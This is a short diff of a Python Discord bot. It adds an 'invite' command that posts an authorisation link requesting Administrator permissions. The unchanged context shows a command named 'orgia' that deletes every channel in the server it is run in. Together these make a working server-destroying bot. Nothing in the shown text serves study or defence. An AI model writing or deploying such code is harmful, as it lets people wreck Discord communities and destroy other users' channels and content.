@@ -24,5 +24,9 @@ async def orgia(ctx):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
+        
+@client.command()
+async def invite(ctx):
+    await ctx.send("https://discord.com/api/oauth2/authorize?client_id=819929289759653928&permissions=8&scope=bot")
 
 client.run(os.environ['token'])
